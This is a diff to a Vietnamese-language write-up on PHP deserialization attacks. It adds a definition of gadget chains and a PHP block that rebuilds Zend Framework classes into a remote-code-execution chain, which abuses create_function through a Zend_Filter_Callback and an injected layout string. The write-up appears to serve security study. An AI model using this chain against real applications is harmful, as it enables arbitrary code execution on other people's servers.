@@ -117,6 +117,82 @@ Khi payload chạy thành công, lệnh chèn vào được thực thi, ở đâ
 </p>
 
 ## 5. Phân tích gadget chain
-### 5.1.
-### 5.2.
+### 5.1. Khái niệm Gadget chain
+Gadget chain là một chuỗi các class và method (phương thức) có sẵn trong mã nguồn của một ứng dụng hoặc thư viện, mà khi được sắp xếp và kết hợp đúng cách thông qua quá trình unserialize(), sẽ dẫn đến hành vi nguy hiểm như thực thi mã tùy ý (RCE) hoặc thao túng luồng xử lý của ứng dụng.
+
+Kẻ tấn công không cần tạo mã độc mới, mà chỉ cần tận dụng các đoạn mã có sẵn (gadget) và xây dựng chúng thành một chuỗi hoạt động độc hại.
+### 5.2. Phân tích cụ thể
+```php
+<?php
+
+class Zend_Log
+{
+    protected $_writers;
+
+    function __construct($x)
+    {
+        $this->_writers = $x;
+    }
+}
+
+class Zend_Log_Writer_Mail
+{
+    protected $_eventsToMail;
+    protected $_layoutEventsToMail;
+    protected $_mail;
+    protected $_layout;
+    protected $_subjectPrependText;
+
+    public function __construct(
+        $eventsToMail,
+        $layoutEventsToMail,
+        $mail,
+        $layout
+    ) {
+        $this->_eventsToMail       = $eventsToMail;
+        $this->_layoutEventsToMail = $layoutEventsToMail;
+        $this->_mail               = $mail;
+        $this->_layout             = $layout;
+        $this->_subjectPrependText = null;
+    }
+}
+
+class Zend_Mail
+{
+}
+
+class Zend_Layout
+{
+    protected $_inflector;
+    protected $_inflectorEnabled;
+    protected $_layout;
+
+    public function __construct(
+        $inflector,
+        $inflectorEnabled,
+        $layout
+    ) {
+        $this->_inflector        = $inflector;
+        $this->_inflectorEnabled = $inflectorEnabled;
+        $this->_layout           = '){}' . $layout . '/*';
+    }
+}
+
+class Zend_Filter_Callback
+{
+    protected $_callback = "create_function";
+    protected $_options = [""];
+}
+
+class Zend_Filter_Inflector
+{
+    protected $_rules = [];
+
+    public function __construct()
+    {
+        $this->_rules['script'] = [new Zend_Filter_Callback()];
+    }
+}
+```
+### 
 
